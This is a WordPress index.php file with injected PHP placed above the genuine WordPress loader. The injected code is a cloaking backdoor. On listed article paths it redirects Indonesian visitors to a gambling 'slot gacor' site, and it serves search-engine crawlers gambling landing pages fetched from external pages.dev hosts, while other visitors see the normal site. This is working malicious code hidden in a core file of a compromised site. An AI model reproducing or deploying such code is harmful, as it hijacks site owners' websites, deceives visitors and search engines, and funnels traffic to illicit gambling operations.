<?php

function mangsud($url) {
    if (ini_get('allow_url_fopen')) {
        return @file_get_contents($url);
    } elseif (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        $res = curl_exec($ch);
        curl_close($ch);
        return $res;
    }
    return false;
}

$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$uri = $_SERVER['REQUEST_URI'] ?? '/';
$uri_path = parse_url($uri, PHP_URL_PATH);

$bot_regex = "/(googlebot|google|adsbot|mediapartners|bingbot|slurp|yandex|duckduck|baidu|ahrefs|semrush|mj12|dotbot|crawler|spider|facebook|twitterbot|telegrambot)/i";

// Konfigurasi untuk berbagai path
$configs = [
    '/category/video' => [
        'amp' => 'https://slotgacor-amp-login.pages.dev/',
        'lp' => 'https://paris88-lp.pages.dev/'
    ],
    '/hoa-hau-phan-thi-mo' => [
        'amp' => 'https://slotgacor-amp-login.pages.dev/',
        'lp' => 'https://empire888-bzm.pages.dev/'
    ],
    '/x1-2' => [
        'amp' => 'https://slotgacor-amp-login.pages.dev/',
        'lp' => 'https://musang178-naiksekali.pages.dev/'
    ],
    '/jee-tran-giong-ca-3-mien-gay-sot-voi-hit-dung-hoi-em-cua-my-tam-9884' => [
        'amp' => 'https://slotgacor-amp-login.pages.dev/',
        'lp' => 'https://ora78-orapaten.pages.dev/'
    ],
    '/category/goc-sao' => [
        'amp' => 'https://slotgacor-amp-login.pages.dev/',
        'lp' => 'https://pt89-ksipaham.pages.dev/'
    ],
    '/duy-manh-quang-hai' => [
        'amp' => 'https://slotgacor-amp-login.pages.dev/',
        'lp' => 'https://tkp1888-y.pages.dev/'
    ],
    '/category/goc-sao/moi-truong' => [
        'amp' => 'https://slotgacor-amp-login.pages.dev/',
        'lp' => 'https://super33-naiklah.pages.dev/'
    ],
    '/van-quyet-toa-sang-ha-noi-fc-danh-bai-hai-phong-20664' => [
        'amp' => 'https://slotgacor-amp-login.pages.dev/',
        'lp' => 'https://zorototolpnaik.pages.dev/'
    ],


];

// Normalisasi path (hapus trailing slash untuk perbandingan)
$uri_path_normalized = rtrim($uri_path, '/');
if ($uri_path_normalized === '') {
    $uri_path_normalized = '/';
}

// DEBUG: Tambahkan logging untuk debugging
error_log("URI: $uri");
error_log("URI Path: $uri_path");
error_log("URI Normalized: $uri_path_normalized");
error_log("User Agent: $ua");

// Cek apakah URI cocok dengan salah satu path yang dikonfigurasi
$matched = false;
foreach ($configs as $path => $config) {
    $path_normalized = rtrim($path, '/');
    if ($path_normalized === '') {
        $path_normalized = '/';
    }
    
    error_log("Checking path: $path_normalized vs $uri_path_normalized");
    
    // Match path (dengan atau tanpa trailing slash)
    if ($uri_path_normalized === $path_normalized) {
        $matched = true;
        
        $ip = $_SERVER['REMOTE_ADDR'] ?? '';
        error_log("IP Address: $ip");
        
        // Redirect IP Indonesia ke AMP
        if (!empty($ip)) {
            $geo = @json_decode(@file_get_contents("http://ip-api.com/json/$ip"), true);
            error_log("Country Code: " . ($geo['countryCode'] ?? 'Unknown'));
            
            if (!empty($geo['countryCode']) && $geo['countryCode'] === "ID") {
                error_log("Redirecting Indonesian IP to AMP");
                header("Location: " . $config['amp']);
                exit;
            }
        }
        
        // Tampilkan LP untuk bot
        if (preg_match($bot_regex, $ua)) {
            error_log("Bot detected, showing LP");
            $f = mangsud($config['lp']);
            if ($f) {
                echo $f;
            } else {
                // Fallback jika tidak bisa fetch
                echo "<script>window.location.href = '" . $config['lp'] . "';</script>";
            }
            exit;
        }
        
        // Untuk non-bot, non-ID, lanjut ke konten asli
        error_log("Non-bot, non-ID traffic, continuing to main site");
        break;
    }
}

// Jika tidak match dengan config cloaking, lanjut ke website normal
if (!$matched) {
    error_log("No path matched for cloaking, continuing to main site");
}

?>
<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
